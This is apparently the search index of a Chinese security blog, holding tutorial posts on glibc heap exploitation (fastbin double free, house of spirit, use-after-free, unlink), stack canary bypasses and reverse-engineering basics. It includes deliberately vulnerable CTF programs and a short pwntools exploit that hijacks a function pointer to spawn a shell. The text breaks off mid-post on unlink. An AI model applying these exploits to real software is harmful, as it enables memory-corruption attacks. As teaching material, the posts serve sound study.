<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>glibc heap Fastbin Corruption</title>
      <link href="/2019/08/16/glibc-heap-fastbin-corruption/"/>
      <url>/2019/08/16/glibc-heap-fastbin-corruption/</url>
      
        <content type="html"><![CDATA[<p>基础知识：</p><ul><li>fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128bytes，32位的是64bytes）  ，它们会被放在被称为fastbin的bin里面</li></ul><img src="/2019/08/16/glibc-heap-fastbin-corruption/1.png" title="This is an image"><p>上面的fastbinsY 里面存放fastbin , 最大是128bytes,最小是32bytes,然后依次加16bytes,32位的类似，不过最大是64bytes</p><ul><li>需要注意的是get_max_fast()事实上返回的是 global_max_fast，但是这个值得初始值为0，只有当第一次malloc之后它才会被赋值为相应的值</li><li>同时fastbin是Single linked list，所以它只使用fd,以NULL结尾</li><li>free的时候呢，不取消下一个chunk 的prev_inuse bit，因为fastbin chunk不会和其他chunk合并</li><li>malloc 和 free的时候glibc会有一些检查，确认heap metadata是否正确，避免一些可能的攻击方式</li><li>fastbin执行效率高，它的里面的检查比其他类型的bin少很多</li><li>fastbin的linklist和其他的相反，跟Stack很像free和malloc的时候先进后出</li><li>fastbin的prev_inuse标志位在free的时候不会改变还是1，这防止了它和其他的free_chunk进行合并操作</li></ul><p>Fastbin Corruption：</p><pre><code>1..让fastbin linked list 指向任意位置，之后的malloc时就会把改地址当做chunk拿出来 2.free（not in_use）的chunk会被存在bin里面，修改它的fd才会造成corruption    1.double free    2.Over flow</code></pre><p>fastbin的检查方式：</p><ul><li>malloc从bin里面取出chunk,要拿到合适大小的chunk（检查你这个chunk的chunk_size</li><li>free的时候，next_chunk的size必须正确（overflow的时候才会用到）</li><li>free时看看bin里面的第一个chunk和现在要free的是不是同一个（fasttop），这个的缺点就是它只和第一个检查，那么你可以在double free之前先free一个其他的大小合适的chunk</li></ul><p>我们可以看源码了解一下（源码我会的不多，只说点关键的）<br>对应1：</p><pre><code>    //这个nb是chunk的bytes 它来源于上面的一个checked_request2size(bytes,nb) 这的作用就是malloc的bytes+8然后16对齐        if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))   //chunk的size(nb)小于128 or 64的话就会执行下面        {               idx = fastbin_index(nb);     //这是在fastbin里面找，把chunk的size转换成fastbin里面对应的哪一个（size/16-2）注意：0是fastbin的第一个               mfastbinptr *fb = &amp;fastbin(av, idx);               mchunkptr pp;               victim = *fb;               if (victim != NULL)               {                       if (SINGLE_THREAD_P)                              *fb = victim-&gt;fd;                       else                              REMOVE_FB(fb, pp, victim);                       if (__glibc_likely(victim != NULL))                       {                              size_t victim_idx = fastbin_index(chunksize(victim));   //victim是要等一下要return的chunk                              if (__builtin_expect(victim_idx != idx, 0))      //这边就是在检查你拿出来的chunk的idx跟bin的idx是不是一样，不对的话error                                      malloc_printerr(&quot;malloc(): memory corruption  (fast)&quot;);</code></pre><p>对应2：</p><pre><code>               if (SINGLE_THREAD_P)               {                       /* Check that the top of the bin is not the record we are going to                          add (i.e., double free).  */                       if (__builtin_expect(old == p, 0))   //这个检查就是看看你free的chunk跟bin里面的chunk是不是同一个，同一个的话就error                              malloc_printerr(&quot;double free or corruption (fasttop)&quot;);                       p-&gt;fd = old;                       *fb = p;               }</code></pre><p>double free也会形成类似UAF的效果，可以改掉bin里面的chunk的fd，可以看一下调试截图和源码</p><pre><code>int main(){    void *p,*q,*r,*s;    p = malloc(30);    q = malloc(30);    free(q);    free(p);    free(q); 第一次断点下在这里}</code></pre><img src="/2019/08/16/glibc-heap-fastbin-corruption/2.png" title="This is an image"><img src="/2019/08/16/glibc-heap-fastbin-corruption/3.png" title="This is an image"><img src="/2019/08/16/glibc-heap-fastbin-corruption/4.png" title="This is an image"><p>更重要的是，现在bin里面有两个q（其实是同一块）都指向了P，<br>利用姿势注意点：</p><ol><li><p>取出的chunk 的size要正确，所以也不是任意地址，需要可以制作假的size</p><ol><li>stack上的变量做size ，可以malloc出一个stack上的位置  （可以制作stack上的overflow）</li><li>got上，用64bits地址常见的0x40（这个got没被call过的话）做size</li></ol></li><li><p>取得chunk后，有机会对改地址任意写</p></li></ol><p>fastbin double free:</p><ol><li>fasttop只检查bin里面的第一个chunk,只要不是连续free同一个chunk就没关系</li><li>double free有类似use after free的效果，可以改掉bin里面的chunk的fd</li></ol><p>例子：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;void sh(char *cmd){    system(cmd);}int main(){    setvbuf(stdout,0,_IONBF,0);    int cmd,idx,sz;    char *ptr[10];    memset(ptr,0,sizeof(ptr));    puts(&quot;1. malloc + gets\n2. free\n3. puts&quot;);    while(1)    {        printf(&quot;&gt; &quot;);        scanf(&quot;%d %d&quot;,&amp;cmd, &amp;idx);        idx %= 10;        if(cmd==1)        {            scanf(&quot;%d%*c&quot;,&amp;sz);            ptr[idx] = malloc(sz);            gets(ptr[idx]);        }        else if(cmd==2)        {            free(ptr[idx]);        }        else if(cmd==3)        {            puts(ptr[idx]);        }        else        {            exit(0);        }    }    return 0;}</code></pre><p>在64位机器上这个题目有个经典的手法来必过fastbin的检查，因为malloc必须要拿到合适的chunk,所以你malloc的chunk的size位必须要跟fastbin里面的chunk的size大小相同，我们可以在构造fastbin的时候用到了double free,这个操作就是先随便malloc2个大小一样的chunk p和q（必须是fastbin的大小）,我们一次free p q p，那么就会绕过一个fastbin检测，同时这个double free也会形成一个类似环状的fastbin<br><img src="/2019/08/16/glibc-heap-fastbin-corruption/5.png" title="This is an image"><br>那么在malloc的时候，如果从这个bin里面获取chunk的话，我们就可以通过三次malloc，两次使用chunk p,这样就可以利用gets实现有限制的地址写入，这个限制就来源于chunk大小检查，同样我们可以利用64位机器好多都是0x40,来将malloc的chunk p利用gets修改到got表的相应位置，那么第三次malloc就会把这个地址的内存当做一个chunk来取出来，进行gets，我们写入shell的地址，那么下次调用got表相应函数的时候就直接getshell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2019/08/16/chunk-extend-and-overlapping/"/>
      <url>/2019/08/16/chunk-extend-and-overlapping/</url>
      
        <content type="html"><![CDATA[<p>chunk extend 堆利用：<br>    程序中堆的利用 可以控制chunk header中的数据 例如：heap overflow<br>ptmalloc 对chunk 操作的存在漏洞。</p><p>首先：怎么获取chunk的大小？</p><pre><code>/* Get size, ignoring use bits */#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))/* Like chunksize, but do not mask SIZE_BITS.  */#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</code></pre><p>其实就是利用了size , 但是一种忽略了掩码部分，一种没有。</p><p>那么怎么获取下一个chunk的位置？<br>这个其实就是利用了隐式链表的技术</p><pre><code>/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</code></pre><p>就是当前块指针加上当前块的大小。</p><p>那么有关前一个chunk的信息呢？<br>答案还在malloc_chunk的结构体里面，</p><pre><code>/* Size of the chunk below P.  Only valid if prev_inuse (P).  */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</code></pre><p>但是这一点的时候要特别注意malloc 和free两种不同的状态。<br>上面简单就是用本chunk - malloc_chunk-&gt;prev_size<br>那么判断是否处于in_use状态就是依靠in_use标志位了</p><pre><code>#define inuse(p)    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</code></pre><p>记住一点：本chunk的 in_use表示的是前一个chunk的状态哦。<br>综合起来chunk的判断 就是依赖于malloc_chunk结构体里面的内容，简单来说就是chunk_header<br>,那么利用思路就自然而然的出来了，我们通过堆漏洞（heap overflow之类的）可以改变chunk_header进而实现漏洞利用</p><p>下面来几个简单的实操：<br>    1.在fastbin 里面的操作：</p><pre><code>/*************************************************************************    &gt; File Name: chunk_extend.c    &gt; Author: 时钟    &gt; Mail: 522796871@qq.com    &gt; Created Time: 2019年08月16日 星期五 11时30分15秒 ************************************************************************/#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){    void *p , *c;    p = malloc(0x10);    malloc(0x10);    *(long long*)((long long)p-0x8) = 0x41;    free(p);    c = malloc(0x32);    return 0;}</code></pre><p>当我们free之后：<br><img src="/2019/08/16/chunk-extend-and-overlapping/1.png" title="This is an image"><br>这接下来的malloc 就可以成功的控制下面的malloc ， 相当于两个指针可以操作同一个chunk了哦。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位 house of spirit</title>
      <link href="/2019/08/03/64-wei-house-of-spirit/"/>
      <url>/2019/08/03/64-wei-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>这个题目有问题，但是重要的是利用思想：可以把源码贴出来帮助理解：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char buf[128];  /*值得注意的是这几个全局变量在bss段是紧挨着排列的*/char *ptr[8];char *cmd;    //fake_chunk要把这个包含进去，这样的话就可以利用fgets实现任意地址写入int size;int n = 0;void sh(char *c){    system(c);}int main(){    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = buf;    while(1)    {        fgets(cmd,sizeof(buf),stdin);        if(!strncmp(cmd,&quot;push&quot;,4))   //strncmp意思是只比较前4个        {            if(n&lt;8)            {                scanf(&quot;%d%*c&quot;,&amp;size);   //这里可以写入size 进而伪造next_chunk_size                ptr[n] = malloc(size);                fgets(ptr[n],size,stdin);                n++;            }            else            {                puts(&quot;stack is full&quot;);            }        }            else if(!strncmp(cmd,&quot;pop&quot;,3))            {                if(n&gt;=0)                {                    n--;                    puts(ptr[n]);                    free(ptr[n]);                    ptr[n] = 0;                }                else                {                    puts(&quot;stack is empty&quot;);                }            }            else{                puts(&quot;unkonwn command&quot;);            }        }    }</code></pre><p>file得知是64位动态链接程序，那么看看ida分析   （push指针共有8个，图里面写错了）<br><img src="/2019/08/03/64-wei-house-of-spirit/1.png" title="This is an image"><br>那么我们的第一步就是伪造chunk ，这一点需要注意的就是地址要16位对齐，否则free的时候无法绕过检查，我们可以把size写入为next_chunk_size来躲过检查，然后把伪造的chunk free掉，然后就是malloc写入把cmd给溢出指向fgets@got，然后fgets把strncmp@got给覆盖了（因为下一个执行的就是strncmp,然后fgets@got的最后2个byte地方可以放参数/bin/sh,其它的可以用00填充 ），下次调用就直接getshell</p>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stack cookie探索</title>
      <link href="/2019/08/03/stack-cookie-tan-suo/"/>
      <url>/2019/08/03/stack-cookie-tan-suo/</url>
      
        <content type="html"><![CDATA[<p>stack cookie的两种讲法</p><ul><li>windows平台上叫 /GS:cookie</li><li>linux上叫Stack Canary</li></ul><p>它的原理就是在ebp-4的地方插入一个随机数（4字节还是8字节看计算机位数了），然后在函数返回（return）的时候会调用另一个函数去检查这个值是否被修改，如果被修改了的话就终止程序，这就使得经典栈溢出的手法难以奏效</p><ul><li>首先在windows平台上，在vs编译的时候有那个安全选项可以加上，然后在调试的时候就直接看函数，我们会发现在以前的经典的push ebp   mov ebp esp , sub esp , 88h这些之后呢，还会有一个mov eax , dword prt [stack_overflow_gs!_security_cookie(00416000)]            xor eax,ebp 这样类似的东西，这个其实就是添加一个随机数进去，然后在程序的结束部分还有一个对应的操作 mov ecx,doword prt [ebp-4]   xor ecx,ebp  call stack_overflow_gs!ILT_25(_security_check_cookie)(00416000)这类操作（具体代码可能不一样但是都是这个意思）</li><li>下面详细说一下：</li><li><p>调试可以发现那个cookie的初始值0041600其实就是.data段的起始地方，在程序运行得时候这里面是个随机数字，但是你在原始文件的PE里面可以看，.data段的值不是全部一样的，为啥呢？其实是在start函数后的有一个_mainCRTStartup的一个库启动的时候有一个函数调用__security_init_cookie 下面是ida里面的情况</p><img src="/2019/08/03/stack-cookie-tan-suo/1.png" title="This is an image"><p>我们可以看出cookie的值有一套自己的计算逻辑，基本上是以系统时间，进程id,性能计数器等作为可变元</p></li><li><p>stack_overflow_gs!ILT_25(_security_check_cookie)这个函数做了什么？  其实里面就是一个cmp 的比较不相等的话跳到函数里面的另一个函数里（这个函数就是终止程序啦，反馈信息了，这么一些个操作），OK   windows上差不多就这些。</p></li></ul><p>下面这个讲linux上的cookie，这个是当前时期的重点：</p><ul><li><p>首先它跟windows第一点的不同就是代码顺序</p><img src="/2019/08/03/stack-cookie-tan-suo/2.png" title="This is an image"></li><li><p>它这个其实是在栈开辟完成后进行的一盘操作而且我们也看到了，这个canary的位置是在ebp - 0xc的位置，然后要知道的一点就是cookie的初始化是在glibc里面进行的，但是不要认为cookie是glibc生成的，其实是内核给的glibc</p></li><li>然后还是最后有个检查嘛</li><li><img src="/2019/08/03/stack-cookie-tan-suo/3.png" title="This is an image"></li></ul><p>下面最最重要的当然是破解手法了：</p><ol><li>其一肯定是暴力破解cookie值，但是这个应用场景有限，你要是没啥前提条件单纯的跑程序的话，cookie的值每次都会变，估计你就呵呵呵了，那么，这个前提条件就是子进程存在栈溢出漏洞（linux上子进程跟父进程之间关系严格）这个意思就是子进程无限的fork，因为在这个时候它的哪个cookie事实上是继承的父进程的cookie，那么父进程fork的时候给子进程的cookie都是哪一个，那么你就暴力破解吧。</li><li>leak info(OOB read，file log)  意思就是程序还存在其他漏洞，想越界读取啊 ， 格式化字符串啊， 其他的一些输出函数啊 ，那么我们调整一些参数，利用这些漏洞可以得到Cookie的值啊。</li><li>迂回绕过，这意思就是我们可以避开cookie的检查（例如我们可以不修改你的ebp , ret_addr，我们就简单的修改你的局部变量来改变程序流程）</li><li>这个就是我们既然得不到cookie, 那么意思就是__stack_chk_fial@plt这个函数非要执行不可了，那我们可以把这个函数给got劫持了，把它里面.got.plt那个地址改成我们shellcode的地址。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap House of Spirit</title>
      <link href="/2019/08/03/glibc-heap-house-of-spirit/"/>
      <url>/2019/08/03/glibc-heap-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>这个技术也是针对于fastbin，属于fastbin_attack的一种。<br>关键：目标位置伪造fastbin chunk并将其释放，进而实现在指定地址分配chunk</p><p>关于free时候的检查：</p><ul><li>free检查会看size的低字节flag的IS_MMAP标志位，M标志位没有被置1才会绕过检查，否则就会调用munmap_chunk函数去释放堆块</li></ul><p>1.free的chunk的size不可以太离谱，不要太大太小，并且chunk要对齐</p><pre><code>       if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)               || __builtin_expect(misaligned_chunk(p), 0))               malloc_printerr(&quot;free(): invalid pointer&quot;);        /* We know that each chunk is at least MINSIZE bytes in size or a           multiple of MALLOC_ALIGNMENT.  */        if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))               malloc_printerr(&quot;free(): invalid size&quot;);</code></pre><p>2.free的时候也会检查当前Chunk的下一个chunk，也是不能太小不能太大（大于2*SIZE_SZ小于system_mem）其中SIZE_SZ在32位上是4，64位上是8</p><pre><code>if (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size))                       &lt;= 2 * SIZE_SZ, 0)                       || __builtin_expect(chunksize(chunk_at_offset(p, size))                              &gt;= av-&gt;system_mem, 0))</code></pre><p>检查绕过：</p><ul><li>fake chunk 的ISMMAP位不能是1 ，因为free的时候如果 是mmap的话 会被单独 处理</li><li>fake chunk 的地址需要对齐</li><li>fake chunk的size大小满足fastbin，并且对齐</li><li>fake chunk的size大小不能小于2*SIZE_SZ（4或者8），同时不能大于av-&gt;system_mem。</li><li>fake chunk对应的fastbin链表头部不能是该fake chunk，即是不能构成double free的情形</li></ul><p>利用条件：</p><ol><li>想要控制的区域的前段空间和后端空间都是内存可控的<br> 1.我们想要控制的目标内存一般是返回地址或者函数指针 ，这个应该属于.text段，所以一般情况下这段内存是我们的输入无法控制的，就是我们控制不了的意思。</li></ol><p>2.存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域</p><p>how2heap里面的相关源码我们可以看一下：</p><pre><code>配出来的时候，就有可能改写我们目标区域。还是像以前一样，先上一段代码给大家一个直观印象再具体解释，这段代码是shellfish的github里面的源码。  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  int main()  {         printf(&quot;This file demonstrates the house of spirit attack.n&quot;);         printf(&quot;Calling malloc() once so that it sets up its memory.n&quot;);         malloc(1);        printf(&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.n&quot;);        unsigned long long *a;        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));        printf(&quot;This region must contain two chunks. The first starts at %p and the second at %p.n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[7]);        printf(&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;);        printf(&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;);        fake_chunks[1] = 0x40; // this is the size        printf(&quot;The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av-&gt;system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .n&quot;);        fake_chunks[9] = 0x2240; // nextsize        printf(&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;, &amp;fake_chunks[1]);        printf(&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;);        a = &amp;fake_chunks[2];        printf(&quot;Freeing the overwritten pointer.n&quot;);        free(a);        printf(&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);        printf(&quot;malloc(0x30): %pn&quot;, malloc(0x30));}</code></pre><p>解析和思路：</p><ol><li>伪造堆块：在可控区域输入数据进而把它伪造成为一个fastbin</li><li>覆盖堆指针指向上一步伪造的堆块</li><li>释放堆块，讲伪造的堆块释放到fastbin单链表里面</li><li>申请堆块，讲刚释放的堆块申请出来，最终使得可以向目标内存里面写入数据</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程小知识</title>
      <link href="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/"/>
      <url>/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p><pre><code>MSVBVM50.rtcMsgBox  \\调用消息框</code></pre><p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br><img src="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p><p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p><p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）</p><ol><li>GOTO 命令（Ctrl+G）然后 F4</li><li>设置断点</li><li>加上注释（快捷键 ; ）</li><li>加上标签 （快捷键 : ）</li></ol><p>快速查找指定代码的四种方法：    </p><ol><li>代码执行法</li><li>字符串检索法</li><li>API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表</li><li>API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API</li></ol><p>函数调用约定：<br>  cdecl:<br>    调用者直接清理其压入栈的函数参数<br>   stdcall:<br>    一个使用例子</p><pre><code>#include &quot;stdio.h&quot;int _stdcall add(int a ,int b){    return a+b;}int main(){    return add(1,2);}</code></pre><p>  这种方式是用被调用函数自己清理栈，其汇编结尾 一般用 RETN+一个数字（栈大小）<br>  fastcall:<br>  与stdcall方式基本相似，但是该方式通过使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前两个）一般为ECX,EDX</p><ul><li>逆向工程中函数调用的返回值一般保存在eax中，在程序call指令之后一般就会有对eax寄存器的处理，这一点可以用来判断函数的用途和结构</li><li><p>.逆向工程中确定函数参数多少的方法：</p><pre><code>进入函数后可以看到它栈空间中存储的返回地址，通过该返回地址你可以找到调用该函数的起始地址，然后可以分析在进入函数体前后的栈空间大小来确定参数多少</code></pre></li><li><p>一些逆向可能会直接在程序内部存在注册码，可以通过找到注册码错误的字符串确定比较注册码正确与否的函数，而在改函数的附近一般会存在正确的注册码。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap UAF</title>
      <link href="/2019/08/02/glibc-heap-uaf/"/>
      <url>/2019/08/02/glibc-heap-uaf/</url>
      
        <content type="html"><![CDATA[<p>use after free（UAF）</p><ul><li>重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空指针）</li><li>还有一个小点就是要注意在64bits的时候有可能会出现高位的\x00截断这种事情</li><li>这个关键的一点就是free掉的内存块，还是可以再次拿出来用的，就想之前free的chunk，malloc的也可以再次拿出来，我们看一个例子</li></ul><pre><code>#include&lt;stdio.h&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;class A{    public:        virtual void print()        {            puts(&quot;class A&quot;);        }};class B:public A{    public:        void print(){            puts(&quot;class B&quot;);        }};void sh(){    system(&quot;sh&quot;);}char buf[1024];int main(){    setvbuf(stdout,0,_IONBF,0);   \\这个setvbuf是C库函数，作用跟参数有关，可以百度一下，目前的作用是    A *p = new B();    delete p;    fgets(buf,sizeof(buf),stdin);    char *q = strdup(buf);   \\这个其实就是有一个malloc分配内存块然后把字符串打印进去    p-&gt;print();}</code></pre><p>然后就要分析一下这个源码，首先看一下strdup的源码，这个函数定义在string.h这个头文件之中，</p><pre><code>char * __strdup(const char *s){   size_t  len = strlen(s) +1;   void *new = malloc(len);   if (new == NULL)      return NULL;   return (char *)memecpy(new,s,len);}</code></pre><p>那么我们开始走程序，我们在delete p下断点执行程序，然后看ida先分析一下，<br><img src="/2019/08/02/glibc-heap-uaf/1.png" title="This is an image"><br>我们可以看到申请了是8bit的内存空间，但是对齐到最后应该会生成一个32位大小的堆块，进GDB<br><img src="/2019/08/02/glibc-heap-uaf/2.png" title="This is an image"><br>我们看到分配的mem在rax里面，而且目前mem刚申请出来，还都是0，其实也可以看到，下面有一个清0的操作，下面来个图带解释<br><img src="/2019/08/02/glibc-heap-uaf/3.png" title="This is an image"><br>call B之后内存块是这样的<br><img src="/2019/08/02/glibc-heap-uaf/4.png" title="This is an image"><br>然后紧接着的delete就给全清0了<br><img src="/2019/08/02/glibc-heap-uaf/5.png" title="This is an image"><br>然后紧接着fgets 输入8个a ，输入到了0x601160这个bss段，然后就指向strdup函数，然后把bss段的东西读入到新申请的mem<br><img src="/2019/08/02/glibc-heap-uaf/6.png" title="This is an image"><br>这时候我们惊喜的发现我们之前的chunk被拿出来用了，被填上了我们的输入，那么因为之前那个指针p没有被置为NULL,所以它还是指向这里的，我们可以利用此来劫持函数流，因为源代码的下面,还可以看看ida里面，有一个p的调用：<br><img src="/2019/08/02/glibc-heap-uaf/7.png" title="This is an image"><br>接下来利用过程就很关键了：<br><img src="/2019/08/02/glibc-heap-uaf/8.png" title="This is an image"><br>我们就可以开做题了：</p><pre><code>#coding:utf-8from pwn import *r = process(&#39;./use-after-free&#39;)buf = 0x601160system_sh = 0x000000000400906r.sendline(p64(buf+8)+p64(system_sh))     #这个送过去的数据不能太大，太大的话就不会申请的原来的chunk,如果想要刚刚好的话是24byte,不过这个不用刚刚好，因为chunk补齐，chunk的最小刚好是32byte,+8是因为对输入的地址要进行解引用的，可以看细看解析的最后一部分r.interactive()</code></pre><p>下面这个是个32位的例子，来自安全客，看题目源码：</p><pre><code>#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);   //定义了一个函数指针，参数类型char *,没有返回值void evil_fuc(char command[]){    system(command);}void echo(char content[]){    printf(&quot;%s&quot;,content);}int main(){    func_ptr *p1=(int*)malloc(4*sizeof(int));    printf(&quot;malloc addr: %pn&quot;,p1);    p1[3]=echo;   //这个代表的是分配出来的内存块的第四个    p1[3](&quot;hello worldn&quot;);    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针    p1[3](&quot;hello againn&quot;); //p1指针未被置空,虽然free了,但仍可使用.    func_ptr *p2=(int*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.    printf(&quot;malloc addr: %pn&quot;,p2);    printf(&quot;malloc addr: %pn&quot;,p1);//p2与p1指针指向的内存为同一地址    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.    p1[3](&quot;whoami&quot;);   //p1这个指针跟先前的操作一样，本来是要传个参数给echo，但是因为被p2改成evil_fuc,参数就给了evil,当然这里换成p2也可以的    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap unlink漏洞</title>
      <link href="/2019/08/02/glibc-heap-unlink-lou-dong/"/>
      <url>/2019/08/02/glibc-heap-unlink-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>知识点：</p><ol><li>free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作</li><li>空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）</li><li>unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需要把前面或者后面的堆块从双向链表中摘取下来，合成更大的堆块插入到别的bin之中，将空闲堆块从bin里面摘取下来的操作就是unlink</li><li>chunk中的flag标志位 ： flag来源 ，size字节需要8字节对齐，就会空余出来3个bit, 其中最低位表示前一个chunk是否在使用，倒数第二位表示这个chunk是否通过mmap的方式产生，第三个表示 该chunk是否属于一个线程的arena</li><li>fd : 指向下一个空闲的chunk，bk指向上一个空闲的chunk</li><li>下面是一个往前合并的源码 ：值得注意的就是free在unlink的时候是先进行backward 然后 forward<pre><code>             /* consolidate backward 往前合并*/            if (!prev_inuse(p)) {     //先检查要free chunk的上一个chunk是不是 in_use，不是的话就往下操作                    prevsize = prev_size(p);   //取p的前一个chunk的size（利用的是p chunk的prev_size）                    size += prevsize;    //free_chunk的size + 上一个chunk的size                    p = chunk_at_offset(p, -((long)prevsize));  //p指向上一个chunk的开始处                     if (__glibc_unlikely(chunksize(p) != prevsize))   //然后这个应该是检查prev_size对不对，利用的是前后改变的chunk的size大小跟prev_size是不是相等                           malloc_printerr(&quot;corrupted size vs. prev_size while  consolidating&quot;);                    unlink(av, p, bck, fwd);   //这个就是我们要利用的地方了，下面有详解            }</code></pre></li><li>同时我截取_int_free的一段源码进行解析：<pre><code>_int_free(mstate av, mchunkptr p, int have_lock)  //这是它的参数 av是指向main_arena , p是指向要free的chunk{if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)   //这个是检查pointer是否合法if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))  //这个检查chunk的size是否合法if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())  //还要检查是否属于fastbin 因为fastbin free的时候有自己的方式else if (!chunk_is_mmapped(p))  //上面那个检查通过后直接跳到这里，检查是否是mmap出来的chunk}</code></pre>8.最重要的就是合并时候的操作： 看6.<br>9.然后就是unlink了：<pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分/*malloc.c  int_free函数中*//* consolidate backward */if (!prev_inuse(p)) {  prevsize = p-&gt;prev_size;size += prevsize;  p = chunk_at_offset(p, -((long) prevsize));  unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来BK = P-&gt;bk;                                   \FD-&gt;bk = BK;                                  \BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）...     